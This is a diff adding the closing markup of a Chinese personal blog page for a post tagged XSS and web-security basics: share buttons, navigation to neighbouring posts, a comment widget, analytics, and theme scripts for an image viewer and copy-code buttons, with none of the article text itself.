+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/06/10/http%E4%B8%8Exss/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E3%80%8AWEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E3%80%8B/" rel="tag">《WEB安全基础》</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2023/06/10/CSRF%E4%B8%8ESSRF/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            CSRF与SSRF
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2023/06/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">文件包含</div>
+      </a>
+    
+  </nav>
+
+  
+   
+  
+   
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2023
+        <i class="ri-heart-fill heart_icon"></i> 是羽泪云诶
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/favicon.ico" alt="小张之栈"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
+
+<script src="/js/clickBoom1.js"></script>
+ 
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
